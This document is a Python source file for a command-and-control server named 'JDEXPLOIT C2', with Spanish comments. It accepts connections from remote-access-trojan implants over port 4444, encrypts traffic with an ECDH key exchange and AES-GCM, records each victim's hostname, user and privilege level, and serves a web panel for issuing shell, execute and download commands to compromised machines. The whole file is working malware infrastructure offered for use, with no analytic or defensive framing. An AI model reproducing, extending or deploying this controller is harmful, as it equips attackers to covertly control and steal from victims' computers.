#!/usr/bin/env python3
# ============================================================================
# JDEXPLOIT C2 - VERSIÓN CON HANDSHAKE DINÁMICO
# ============================================================================

import os
import sys
import json
import time
import socket
import struct
import threading
import hashlib
import base64
import datetime
import logging
from http import server
from socketserver import ThreadingMixIn
from urllib.parse import urlparse

try:
    from cryptography.hazmat.primitives.asymmetric import ec
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives.kdf.hkdf import HKDF
    from cryptography.exceptions import InvalidTag
    CRYPTO_AVAILABLE = True
except ImportError:
    print("[!] Instala cryptography: pip install cryptography")
    sys.exit(1)

# ============================================================================
# CONFIGURACIÓN
# ============================================================================
HOST = '0.0.0.0'
C2_PORT = 4444
WEB_PORT = 8080
LOG_FILE = 'c2_operations.log'

class Colors:
    RED = '\033[91m'; GREEN = '\033[92m'; YELLOW = '\033[93m'
    BLUE = '\033[94m'; MAGENTA = '\033[95m'; CYAN = '\033[96m'
    WHITE = '\033[97m'; END = '\033[0m'

logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s',
                    handlers=[logging.FileHandler(LOG_FILE), logging.StreamHandler()])
logger = logging.getLogger('C2')

# ============================================================================
# CLIENTE SEGURO CON HANDSHAKE DINÁMICO
# ============================================================================
class SecureClient:
    def __init__(self, conn, addr):
        self.conn = conn
        self.addr = addr
        self.id = hashlib.md5(f"{addr[0]}:{addr[1]}:{time.time()}".encode()).hexdigest()[:8]
        self.hostname = "Unknown"
        self.username = "Unknown"
        self.os = "Windows"
        self.privilege = "USER"
        self.first_seen = datetime.datetime.now()
        self.last_seen = datetime.datetime.now()
        self.active = True
        
        # Criptografía
        self.private_key = ec.generate_private_key(ec.SECP256R1())
        self.public_key = self.private_key.public_key()
        self.session_key = None
        self.encrypted = False
        
        logger.info(f"{Colors.GREEN}[+] Nuevo cliente: {self.id}{Colors.END}")
    
    def perform_key_exchange(self):
        """Handshake ECDH con lectura dinámica de clave pública"""
        try:
            logger.info(f"{Colors.CYAN}[*] Handshake con {self.id}{Colors.END}")
            
            # PASO 1: Recibir clave pública del RAT (leer primero 4 bytes de longitud)
            raw_len = self.recvall(4)
            if not raw_len:
                logger.error(f"{Colors.RED}[-] No se recibió longitud{Colors.END}")
                return False
            
            key_len = struct.unpack('>I', raw_len)[0]
            logger.info(f"{Colors.CYAN}[*] Longitud clave: {key_len} bytes{Colors.END}")
            
            if key_len < 50 or key_len > 1024:
                logger.error(f"{Colors.RED}[-] Longitud inválida: {key_len}{Colors.END}")
                return False
            
            # Recibir clave pública
            pub_key_data = self.recvall(key_len)
            if not pub_key_data:
                logger.error(f"{Colors.RED}[-] No se recibió clave pública{Colors.END}")
                return False
            
            logger.info(f"{Colors.GREEN}[+] Recibidos {len(pub_key_data)} bytes{Colors.END}")
            
            # PASO 2: Cargar clave pública del peer
            try:
                peer_public_key = serialization.load_der_public_key(pub_key_data)
                logger.info(f"{Colors.GREEN}[+] Clave pública cargada{Colors.END}")
            except Exception as e:
                logger.error(f"{Colors.RED}[-] Error cargando clave: {e}{Colors.END}")
                return False
            
            # PASO 3: Generar shared secret
            shared_secret = self.private_key.exchange(ec.ECDH(), peer_public_key)
            logger.info(f"{Colors.GREEN}[+] Shared secret: {len(shared_secret)} bytes{Colors.END}")
            
            # PASO 4: Derivar clave de sesión
            hkdf = HKDF(algorithm=hashes.SHA256(), length=32, salt=None, info=b'jdexploit-key')
            self.session_key = hkdf.derive(shared_secret)
            
            # PASO 5: Enviar nuestra clave pública (con longitud)
            pub_der = self.public_key.public_bytes(
                encoding=serialization.Encoding.DER,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
            )
            
            # Enviar longitud + clave
            len_prefix = struct.pack('>I', len(pub_der))
            if not self.send_raw(len_prefix + pub_der):
                logger.error(f"{Colors.RED}[-] Error enviando clave{Colors.END}")
                return False
            
            self.encrypted = True
            logger.info(f"{Colors.GREEN}[+] Handshake completado con {self.id}{Colors.END}")
            return True
            
        except Exception as e:
            logger.error(f"{Colors.RED}[-] Error en handshake: {e}{Colors.END}")
            return False
    
    def encrypt_aes_gcm(self, data):
        if not self.session_key:
            return data.encode() if isinstance(data, str) else data
        try:
            if isinstance(data, str):
                data = data.encode('utf-8')
            iv = os.urandom(12)
            cipher = Cipher(algorithms.AES(self.session_key), modes.GCM(iv))
            encryptor = cipher.encryptor()
            ciphertext = encryptor.update(data) + encryptor.finalize()
            return iv + ciphertext + encryptor.tag
        except Exception as e:
            logger.error(f"Error cifrando: {e}")
            return data
    
    def decrypt_aes_gcm(self, data):
        if not self.session_key or len(data) < 28:
            return data.decode('utf-8', errors='ignore') if isinstance(data, bytes) else data
        try:
            iv = data[:12]
            tag = data[-16:]
            ciphertext = data[12:-16]
            cipher = Cipher(algorithms.AES(self.session_key), modes.GCM(iv, tag))
            decryptor = cipher.decryptor()
            plaintext = decryptor.update(ciphertext) + decryptor.finalize()
            return plaintext.decode('utf-8', errors='ignore')
        except InvalidTag:
            logger.error("Tag inválido")
            return data.decode('utf-8', errors='ignore') if isinstance(data, bytes) else data
        except Exception as e:
            logger.error(f"Error descifrando: {e}")
            return data.decode('utf-8', errors='ignore') if isinstance(data, bytes) else data
    
    def send_raw(self, data):
        try:
            if isinstance(data, str):
                data = data.encode('utf-8')
            self.conn.send(struct.pack('>I', len(data)) + data)
            self.last_seen = datetime.datetime.now()
            return True
        except Exception as e:
            logger.error(f"Error send_raw: {e}")
            self.active = False
            return False
    
    def send(self, data):
        if self.encrypted and self.session_key:
            encrypted = self.encrypt_aes_gcm(data)
            return self.send_raw(encrypted)
        return self.send_raw(data)
    
    def recvall(self, n):
        data = bytearray()
        while len(data) < n:
            try:
                packet = self.conn.recv(n - len(data))
                if not packet:
                    return None
                data.extend(packet)
            except socket.timeout:
                continue
            except Exception as e:
                logger.error(f"Error recvall: {e}")
                return None
        return bytes(data)
    
    def recv_raw(self):
        try:
            raw_len = self.recvall(4)
            if not raw_len:
                return None
            msglen = struct.unpack('>I', raw_len)[0]
            if msglen > 10 * 1024 * 1024:
                logger.error(f"Mensaje demasiado grande: {msglen}")
                return None
            return self.recvall(msglen)
        except Exception as e:
            logger.error(f"Error recv_raw: {e}")
            self.active = False
            return None
    
    def recv(self):
        encrypted = self.recv_raw()
        if not encrypted:
            return None
        if self.encrypted and self.session_key:
            return self.decrypt_aes_gcm(encrypted)
        return encrypted.decode('utf-8', errors='ignore') if isinstance(encrypted, bytes) else encrypted
    
    def to_dict(self):
        return {
            'id': self.id,
            'ip': self.addr[0],
            'hostname': self.hostname,
            'username': self.username,
            'privilege': self.privilege,
            'status': 'online' if self.active else 'offline',
            'encrypted': self.encrypted,
            'first_seen': self.first_seen.strftime('%H:%M:%S')
        }

# ============================================================================
# C2 CORE
# ============================================================================
class C2Core:
    def __init__(self):
        self.clients = {}
        self.running = True
        self.lock = threading.Lock()
        self.start_time = datetime.datetime.now()
        logger.info(f"{Colors.GREEN}[🔥] C2 Core iniciado{Colors.END}")
    
    def start(self):
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind((HOST, C2_PORT))
            self.socket.listen(100)
            self.socket.settimeout(1.0)
            logger.info(f"{Colors.GREEN}[🔥] Escuchando en {HOST}:{C2_PORT}{Colors.END}")
            threading.Thread(target=self.accept_clients, daemon=True).start()
        except Exception as e:
            logger.error(f"Error: {e}")
            sys.exit(1)
    
    def accept_clients(self):
        while self.running:
            try:
                conn, addr = self.socket.accept()
                conn.settimeout(10.0)
                
                with self.lock:
                    client = SecureClient(conn, addr)
                    
                    # Handshake
                    if client.perform_key_exchange():
                        self.clients[client.id] = client
                        
                        # Solicitar INFO
                        client.send("INFO")
                        info = client.recv()
                        if info:
                            try:
                                data = json.loads(info)
                                client.hostname = data.get('hostname', 'Unknown')
                                client.username = data.get('username', 'Unknown')
                                client.privilege = data.get('privilege', 'USER')
                                logger.info(f"{Colors.CYAN}[→] {client.hostname} - {client.username}{Colors.END}")
                            except:
                                logger.info(f"{Colors.CYAN}[→] {info[:50]}{Colors.END}")
                    else:
                        conn.close()
                        
            except socket.timeout:
                continue
            except Exception as e:
                if self.running:
                    logger.error(f"Error: {e}")
    
    def send_command(self, client_id, command):
        with self.lock:
            if client_id not in self.clients:
                return f"[-] Cliente no encontrado"
            client = self.clients[client_id]
            if not client.active:
                return f"[-] Cliente offline"
        
        try:
            logger.info(f"{Colors.BLUE}[→] {command}{Colors.END}")
            if not client.send(command):
                return f"[-] Error enviando"
            
            response = client.recv()
            if response is None:
                client.active = False
                return f"[-] Sin respuesta"
            
            return response
        except Exception as e:
            return f"[-] Error: {e}"
    
    def stop(self):
        self.running = False
        if hasattr(self, 'socket'):
            self.socket.close()

# ============================================================================
# WEB HANDLER
# ============================================================================
class WebHandler(server.BaseHTTPRequestHandler):
    c2 = None
    
    def do_GET(self):
        path = urlparse(self.path).path
        if path == '/':
            self.send_html()
        elif path == '/api/clients':
            self.send_clients()
        else:
            self.send_error(404)
    
    def do_POST(self):
        if self.path == '/api/command':
            self.handle_command()
        else:
            self.send_error(404)
    
    def handle_command(self):
        length = int(self.headers.get('Content-Length', 0))
        data = json.loads(self.rfile.read(length))
        
        client_id = data.get('client_id')
        command = data.get('command', '')
        args = data.get('args', '')
        
        if not client_id:
            self.send_json({'error': 'No client_id'})
            return
        
        # Construir comando
        if command == 'shell' and args:
            full_cmd = f"SHELL {args}"
        elif command == 'exec' and args:
            full_cmd = f"EXEC {args}"
        elif command == 'download' and args:
            full_cmd = f"DOWNLOAD {args}"
        else:
            full_cmd = command
        
        response = self.c2.send_command(client_id, full_cmd)
        self.send_json({'response': response})
    
    def send_json(self, obj):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(obj).encode())
    
    def send_clients(self):
        with self.c2.lock:
            clients = [c.to_dict() for c in self.c2.clients.values()]
        self.send_json(clients)
    
    def send_html(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
        html = """<!DOCTYPE html>
<html>
<head>
    <title>JDEXPLOIT C2</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
        .client { border: 1px solid #f00; margin: 5px; padding: 10px; cursor: pointer; }
        .client:hover { background: #100; }
        .online { color: #0f0; }
        .offline { color: #f00; }
        .terminal { background: #111; padding: 10px; height: 300px; overflow-y: scroll; margin: 10px 0; }
        input { width: 80%; padding: 5px; background: #000; color: #0f0; border: 1px solid #f00; }
        button { padding: 5px 10px; background: #f00; color: #000; border: none; cursor: pointer; }
        .encrypted { color: #ff0; }
    </style>
</head>
<body>
    <h1>🔴 JDEXPLOIT C2</h1>
    <div id="clients"></div>
    <div class="terminal" id="terminal"></div>
    <input type="text" id="cmd" placeholder="Comando" disabled>
    <button onclick="sendCmd()" id="send" disabled>Ejecutar</button>

    <script>
        let currentClient = null;
        let clients = {};
        
        setInterval(loadClients, 2000);
        
        function loadClients() {
            fetch('/api/clients')
                .then(r => r.json())
                .then(data => {
                    clients = {};
                    data.forEach(c => clients[c.id] = c);
                    renderClients(data);
                });
        }
        
        function renderClients(list) {
            let html = '';
            list.forEach(c => {
                let encrypted = c.encrypted ? '🔒' : '🔓';
                html += `<div class="client ${c.status}" onclick="selectClient('${c.id}')">
                    ${encrypted} <strong>${c.id}</strong> | ${c.hostname} | ${c.username} | ${c.privilege}
                </div>`;
            });
            document.getElementById('clients').innerHTML = html;
        }
        
        function selectClient(id) {
            currentClient = id;
            document.getElementById('cmd').disabled = false;
            document.getElementById('send').disabled = false;
            addToTerminal(`[+] Conectado a ${clients[id].hostname}`);
        }
        
        function sendCmd() {
            let cmd = document.getElementById('cmd').value;
            if (!cmd || !currentClient) return;
            
            addToTerminal(`> ${cmd}`);
            document.getElementById('cmd').value = '';
            
            let parts = cmd.split(' ');
            fetch('/api/command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    client_id: currentClient,
                    command: parts[0],
                    args: parts.slice(1).join(' ')
                })
            })
            .then(r => r.json())
            .then(data => addToTerminal(data.response));
        }
        
        function addToTerminal(text) {
            let t = document.getElementById('terminal');
            t.innerHTML += `<div>${text}</div>`;
            t.scrollTop = t.scrollHeight;
        }
        
        document.getElementById('cmd').addEventListener('keypress', function(e) {
            if (e.key == 'Enter') sendCmd();
        });
        
        loadClients();
    </script>
</body>
</html>"""
        self.wfile.write(html.encode())
    
    def log_message(self, format, *args):
        pass

class ThreadedHTTPServer(ThreadingMixIn, server.HTTPServer):
    daemon_threads = True

# ============================================================================
# MAIN
# ============================================================================
def main():
    print(f"""
{Colors.RED}
     ██╗██████╗ ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗
     ██║██╔══██╗██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
     ██║██║  ██║█████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   
██   ██║██║  ██║██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   
╚█████╔╝██████╔╝███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   
 ╚════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
{Colors.END}
{Colors.GREEN}[🔥] JDEXPLOIT C2 - HANDSHAKE DINÁMICO{Colors.END}
    """)
    
    c2 = C2Core()
    c2.start()
    
    WebHandler.c2 = c2
    server = ThreadedHTTPServer((HOST, WEB_PORT), WebHandler)
    print(f"{Colors.CYAN}[*] Web UI: http://{HOST}:{WEB_PORT}{Colors.END}")
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        c2.stop()
        server.shutdown()

if __name__ == '__main__':
    main()
